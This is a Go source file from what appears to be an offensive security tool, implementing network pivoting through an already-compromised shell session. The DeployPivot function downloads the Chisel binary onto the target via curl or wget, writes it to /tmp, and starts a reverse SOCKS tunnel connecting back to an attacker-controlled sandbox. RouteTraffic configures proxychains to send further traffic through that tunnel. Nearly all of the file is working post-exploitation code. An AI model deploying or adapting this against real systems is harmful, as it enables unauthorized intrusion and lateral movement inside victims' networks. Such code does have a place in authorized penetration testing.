package pivot

import (
	"context"
	"fmt"

	"github.com/0xP4X/drogonclaw-go/internal/sandbox"
	"github.com/0xP4X/drogonclaw-go/internal/shell"
)

// DeployPivot deploys the Chisel server in the sandbox and the client via an active shell session.
// If sandboxIP is empty, the real container IP is resolved automatically via Docker inspection.
func DeployPivot(ctx context.Context, sessionID string, localPort int, sandboxIP string, sb *sandbox.Docker) (string, error) {
	s, ok := shell.GlobalShells.Get(sessionID)
	if !ok {
		return "", fmt.Errorf("session %s not found", sessionID)
	}

	// Resolve the sandbox IP if not explicitly provided
	if sandboxIP == "" {
		sandboxIP = sb.GetContainerIP(ctx)
	}
	if sandboxIP == "" {
		return "", fmt.Errorf("could not determine sandbox IP — pass sandbox_ip explicitly")
	}

	// 1. Download Chisel to sandbox (if not exists)
	dlCmd := "if [ ! -f /usr/local/bin/chisel ]; then curl -sL https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz | gunzip -c > /usr/local/bin/chisel && chmod +x /usr/local/bin/chisel; fi"
	if _, err := sb.Execute(ctx, dlCmd); err != nil {
		return "", fmt.Errorf("failed to download chisel in sandbox: %v", err)
	}

	// 2. Start Chisel server in sandbox (background)
	serverCmd := fmt.Sprintf("nohup chisel server -p %d --reverse > /tmp/chisel_server.log 2>&1 &", localPort)
	if _, err := sb.Execute(ctx, serverCmd); err != nil {
		return "", fmt.Errorf("failed to start chisel server: %v", err)
	}

	// 3. Drop Chisel client on the target via the active shell
	// Assumes the target is Linux and has outbound internet; attempts curl then wget as fallback.
	clientDropCmd := fmt.Sprintf(
		`curl -sL https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz | gunzip -c > /tmp/chisel && chmod +x /tmp/chisel || wget -qO- https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz | gunzip -c > /tmp/chisel && chmod +x /tmp/chisel`,
	)
	if out, err := s.Send(clientDropCmd); err != nil {
		return "", fmt.Errorf("failed to drop chisel on target: %v, output: %s", err, out)
	}

	// 4. Run Chisel client on target connecting back to the real sandbox IP
	clientConnectCmd := fmt.Sprintf("nohup /tmp/chisel client %s:%d R:socks > /tmp/chisel_client.log 2>&1 &", sandboxIP, localPort)
	if out, err := s.Send(clientConnectCmd); err != nil {
		return "", fmt.Errorf("failed to run chisel on target: %v, output: %s", err, out)
	}

	return fmt.Sprintf(
		"[+] Chisel server started in sandbox on port %d.\n[+] Chisel client deployed and connecting from target to %s:%d.\n[+] SOCKS5 proxy available at 127.0.0.1:1080 inside the sandbox.\n[i] Configure proxychains with: socks5 127.0.0.1 1080",
		localPort, sandboxIP, localPort,
	), nil
}

// RouteTraffic updates the proxychains configuration inside the sandbox.
func RouteTraffic(ctx context.Context, subnet string, proxyPort int, sb *sandbox.Docker) (string, error) {
	// Modify /etc/proxychains4.conf in the sandbox
	// Ensure proxychains is installed
	if _, err := sb.Execute(ctx, "apt-get update && apt-get install -y proxychains4"); err != nil {
		return "", fmt.Errorf("failed to install proxychains: %v", err)
	}

	// Update config: remove trailing socks4 line and add our socks5
	cfgCmd := fmt.Sprintf(`sed -i '$d' /etc/proxychains4.conf && echo 'socks5 127.0.0.1 %d' >> /etc/proxychains4.conf`, proxyPort)
	if out, err := sb.Execute(ctx, cfgCmd); err != nil {
		return "", fmt.Errorf("failed to update proxychains: %v, output: %s", err, out)
	}

	return fmt.Sprintf("[+] Routing updated. proxychains4 configured for socks5 on 127.0.0.1:%d.\n[i] Prefix subsequent commands with 'proxychains4' to route traffic.", proxyPort), nil
}
